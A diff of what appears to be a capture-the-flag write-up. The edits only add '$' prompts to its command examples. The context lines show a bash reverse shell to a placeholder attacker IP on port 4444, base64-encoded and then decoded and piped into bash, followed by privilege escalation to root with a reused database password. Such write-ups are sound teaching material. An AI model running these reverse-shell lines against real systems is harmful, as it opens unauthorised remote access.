@@ -131,14 +131,14 @@ Each time I ran the commands on the site above, none of them worked. I have used
 With that in mind, I base64 encoded the payload so that it could transfer properly. Here is the command I used to encode it:
 
 ```bash
-echo "bash -i >& /dev/tcp/<attack_box_ip>/4444 0>&1" | base64
+$ echo "bash -i >& /dev/tcp/<attack_box_ip>/4444 0>&1" | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC88YXR0YWNrX2JveF9pcD4vNDQ0NCAwPiYxCg==
 ```
 
 I am using a command that will not work because the attack_box_ip must be filled in. I took the output of the previous command and ran:
 
 ```bash
-echo "YmFzaCAtaSA+JiAvZGV2L3RjcC88YXR0YWNrX2JveF9pcD4vNDQ0NCAwPiYxCg==" | base64 -d | bash
+$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC88YXR0YWNrX2JveF9pcD4vNDQ0NCAwPiYxCg==" | base64 -d | bash
 ```
 
 I have a shell. I'm in!
@@ -169,7 +169,7 @@ $db['default'] = array(
 Since the username is root. I tried to log in as the root user with that password:
 
 ```bash
-su root
+$ su root
 ```
 
 It worked. I'm in! The cursor changed to the # character to let me know that I was root. I ran the following to get the flag:
